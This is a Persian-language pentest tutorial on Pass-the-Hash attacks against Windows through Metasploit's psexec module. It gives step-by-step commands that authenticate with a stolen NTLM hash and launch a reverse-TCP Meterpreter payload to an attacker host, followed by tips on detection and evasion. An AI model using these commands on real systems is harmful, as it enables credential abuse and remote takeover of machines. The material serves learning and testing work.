## 1️⃣ ایده کلی Pass-The-Hash

- در ویندوز، وقتی لاگین می‌کنی، سیستم پسورد رو ذخیره نمی‌کنه؛ بلکه **هش NTLM** رو نگه می‌داره.
    
- اگر این هش رو داشته باشی، می‌تونی بدون داشتن پسورد اصلی وارد سیستم بشی.
    
- در PTH، ما **هش NTLM** رو به جای پسورد به سیستم مقصد می‌فرستیم و سرویس مقصد قبولش می‌کنه.
    

---

## 2️⃣ چرا `psexec`؟

- `psexec` در اصل یک ابزار مایکروسافته که بهت اجازه میده روی یک ماشین ویندوزی دستور از راه دور اجرا کنی (با SMB).
    
- متاسپلویت ماژولی به اسم `exploit/windows/smb/psexec` داره که همین کار رو می‌کنه.
    
- این ماژول از **SMB** و سرویس **ADMIN$** استفاده می‌کنه تا فایل اجرایی رو روی سیستم هدف بذاره و اجرا کنه.
    

---

## 3️⃣ پیش‌نیازها

برای اجرای PTH با این روش باید:

- **هش NTLM** کاربر هدف رو داشته باشی (معمولاً از ابزارهایی مثل `mimikatz`، `secretsdump.py`، یا `hashdump` به دست میاد).
    
- پورت **445** روی سیستم هدف باز باشه (SMB).
    
- کاربر هدف دسترسی **Admin** روی سیستم داشته باشه.
    

---

## 4️⃣ مراحل در متاسپلویت

1. **اجرای متاسپلویت**
    

```bash
msfconsole
```

2. **انتخاب ماژول psexec**
    

```bash
use exploit/windows/smb/psexec
```

3. **تنظیم IP هدف**
    

```bash
set RHOSTS 192.168.1.100
```

4. **تنظیم کاربر**
    

```bash
set SMBUser administrator
```

5. **وارد کردن هش (LM و NTLM)**
    

- اگر LM هش رو نداری، می‌تونی مقدارش رو `aad3b435b51404eeaad3b435b51404ee` بذاری (مقدار پیش‌فرض برای LM خالی).
    

```bash
set SMBPass aad3b435b51404eeaad3b435b51404ee:5f2c3d5b3b9b6a6a0f3e5d4b8a0f2b7d
```

6. **انتخاب Payload**
    

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

7. **تنظیم LHOST**
    

```bash
set LHOST 192.168.1.10
```

8. **اجرای اکسپلویت**
    

```bash
exploit
```

---

## 5️⃣ اتفاق پشت‌صحنه

وقتی `exploit` رو اجرا می‌کنی:

1. ماژول با SMB به هدف وصل میشه و هش رو به جای پسورد ارسال می‌کنه.
    
2. اگر هش معتبر باشه، اجازه لاگین می‌گیره.
    
3. یک فایل اجرایی Meterpreter رو در `ADMIN$` آپلود می‌کنه.
    
4. فایل اجرا میشه و یک **Meterpreter session** برمی‌گرده.
    

---

## 6️⃣ نکات امنیتی

- این روش روی ویندوز‌های جدیدتر ممکنه به خاطر **SMB Signing** یا **Credential Guard** کار نکنه.
    
- خیلی از آنتی‌ویروس‌ها psexec متاسپلویت رو می‌شناسن.
    
- بهتره از جایگزین‌هایی مثل `psexec_psh` یا `smbexec` در محیط‌های با امنیت بالاتر استفاده بشه.
